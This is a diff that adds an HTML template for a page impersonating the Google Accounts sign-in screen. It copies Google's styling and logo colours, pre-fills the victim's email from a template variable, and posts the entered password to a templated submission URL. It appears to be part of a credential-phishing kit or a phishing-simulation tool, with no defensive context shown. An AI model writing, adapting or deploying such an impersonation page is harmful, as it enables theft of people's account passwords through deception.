@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in - Google Accounts</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Google Sans',Roboto,Arial,sans-serif;background-color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.container{width:450px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px}
+.google-logo{text-align:center;margin-bottom:16px}
+.google-logo span{font-size:24px;font-weight:500}
+.google-logo .g-blue{color:#4285f4}.google-logo .g-red{color:#ea4335}.google-logo .g-yellow{color:#fbbc05}.google-logo .g-green{color:#34a853}
+h1{text-align:center;font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}
+.subtitle{text-align:center;font-size:16px;color:#202124;margin-bottom:32px}
+.email-chip{display:flex;align-items:center;justify-content:center;margin-bottom:24px}
+.email-chip span{display:inline-flex;align-items:center;padding:4px 12px;border:1px solid #dadce0;border-radius:16px;font-size:14px;color:#3c4043}
+.email-chip span::before{content:"";display:inline-block;width:20px;height:20px;background:#5f6368;border-radius:50%;margin-right:8px}
+.form-group{margin-bottom:24px;position:relative}
+input[type="password"]{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;font-family:inherit}
+input:focus{border:2px solid #1a73e8;padding:12px 14px}
+label.float-label{position:absolute;left:15px;top:14px;color:#5f6368;font-size:16px;transition:all 0.2s;pointer-events:none}
+input:focus+label.float-label,input:not(:placeholder-shown)+label.float-label{top:-8px;left:12px;font-size:12px;color:#1a73e8;background:#fff;padding:0 4px}
+.links{margin-bottom:32px}
+.links a{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500}
+.links a:hover{text-decoration:underline}
+.actions{display:flex;justify-content:space-between;align-items:center}
+.actions a{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500}
+.actions a:hover{text-decoration:underline}
+.submit-btn{padding:8px 24px;background-color:#1a73e8;color:#fff;border:none;font-size:14px;font-weight:500;border-radius:4px;cursor:pointer;font-family:inherit;letter-spacing:0.25px;min-width:80px;height:36px}
+.submit-btn:hover{background-color:#1765cc;box-shadow:0 1px 2px rgba(0,0,0,0.3)}
+.footer{text-align:center;margin-top:32px;font-size:12px;color:#5f6368}
+.footer a{color:#5f6368;margin:0 8px}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="google-logo">
+<span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
+</div>
+
+<h1>Welcome</h1>
+<div class="subtitle">
+
+<div class="email-chip"><span>{{.Email}}</span></div>
+</div>
+
+<form method="POST" action="{{.SubmitURL}}">
+<input type="hidden" name="email" value="{{.Email}}">
+
+<div class="form-group">
+<input type="password" name="password" placeholder=" " required autofocus id="pass">
+<label class="float-label" for="pass">Enter your password</label>
+</div>
+
+<div class="links">
+<a href="#">Forgot password?</a>
+</div>
+
+<div class="actions">
+<a href="#">Create account</a>
+<button type="submit" class="submit-btn">Next</button>
+</div>
+</form>
+
+<div class="footer">
+<a href="#">Help</a>
+<a href="#">Privacy</a>
+<a href="#">Terms</a>
+</div>
+</div>
+</body>
+</html>
